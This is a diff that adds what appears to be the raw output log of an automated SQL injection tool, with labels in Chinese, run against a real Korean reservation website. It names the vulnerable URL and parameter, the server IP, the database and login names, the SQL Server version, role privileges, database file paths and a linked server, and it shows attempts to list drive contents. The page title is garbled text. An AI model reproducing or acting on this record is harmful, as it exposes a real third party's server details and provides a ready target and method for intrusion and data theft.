@@ -1,0 +1,87 @@
+■漏洞信息:============================================================
+ ·URL:http://www.yangpyung.com/reserve/content.asp?id=530
+ ·页面标题：剧乞奇记, 奇记, 埔记, 刮冠, 槛冠, 包堡瘤, 侩巩魂, 侩巩荤, 篮青唱公, 剧乞, 剧乞焙, 绵力, 能档, 龋炮, 饭器明, 荐惑胶虐, 漂魂拱, 眉氰咯青, 揭, 包堡沥焊, 况农讥, 窜眉咯青, 骏萍, MT, 咐乐绰笼, 捞祸冈芭府, 侥寸!  :: 矫沉拱凉凉凉
+ ·参数:id=530
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:116.193.91.167
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 09:15:47 GMT
+Server: WWW Server/1.1
+X-Powered-By: ASP.NET
+Content-Length: 133451
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDQABATBCQ=KJMJCHHAEIJKOCMOBAPAGMIC; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：YPMain
+- 用户名：yp2008
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：YP01
+- 服务名：MSSQLSERVER
+- 系统用户名：yp2008
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+ggsad	C:\Documents and Settings\Administrator\官帕 拳搁\版扁厘局牢眉腊雀磊丰2\DB\ggsad.mdf	
+haechorang	C:\Program Files\Microsoft SQL Server\MSSQL\data\haechorang_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+museum31db	C:\Program Files\Microsoft SQL Server\MSSQL\data\museum31db_Data.MDF	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+yang31db	C:\Program Files\Microsoft SQL Server\MSSQL\data\yang31db_Data.MDF	
+YPMain	C:\Program Files\Microsoft SQL Server\MSSQL\Data\ypguide_db_Data.MDF	
+ypmain33	C:\Program Files\Microsoft SQL Server\MSSQL\Data\ypmain33_db_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+YP01	SQL Server	SQLOLEDB	YP01		YP01	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
+Dir of C:: 
+一次性获取失败，正在批次获取……
